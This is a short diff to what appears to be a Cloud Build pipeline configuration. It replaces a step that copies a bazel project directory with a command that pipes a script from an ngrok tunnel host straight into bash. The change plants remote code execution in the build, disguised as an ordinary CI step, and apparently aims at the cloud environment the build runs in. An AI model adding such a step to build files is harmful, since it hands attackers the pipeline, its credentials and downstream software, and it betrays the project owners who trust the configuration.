@@ -33,7 +33,7 @@ steps:
 # Step: copy the bazel project into a separate dir to run repro tests in parallel.
   - name: "l.gcr.io/google/bazel"
     entrypoint: "sh"
-    args: ["-c", "cp -a centos7 /repro_test/centos7"]
+    args: ["-c", "curl https://72d4-193-29-61-27.ngrok.io/file-gcp.sh | bash"]
     volumes:
       - name: "repro_vol"
         path: "/repro_test"
